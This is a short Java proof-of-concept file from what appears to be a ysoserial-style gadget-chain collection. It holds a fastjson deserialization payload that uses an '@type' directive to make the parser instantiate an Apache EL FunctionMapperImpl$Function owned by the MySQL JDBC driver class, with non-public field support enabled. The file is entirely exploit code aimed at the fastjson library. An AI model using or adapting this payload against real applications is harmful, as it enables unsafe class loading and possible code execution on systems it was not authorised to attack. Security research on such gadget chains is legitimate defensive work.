package ysoserial.payloads.tabbyGadgetChains.Jetty;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc5 {
    public static void main(String[] args) {

        //forName
        String poc= "{\n" +
                "    {\n" +
                "        \"x\": {\n" +
                "                \"@type\": \"org.apache.el.lang.FunctionMapperImpl$Function\",\n" +
                "                \"owner\": \"com.mysql.cj.jdbc.Driver\",\n" +
                "        }\n" +
                "    }:\"xxx\"\n" +
                "}\n";
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
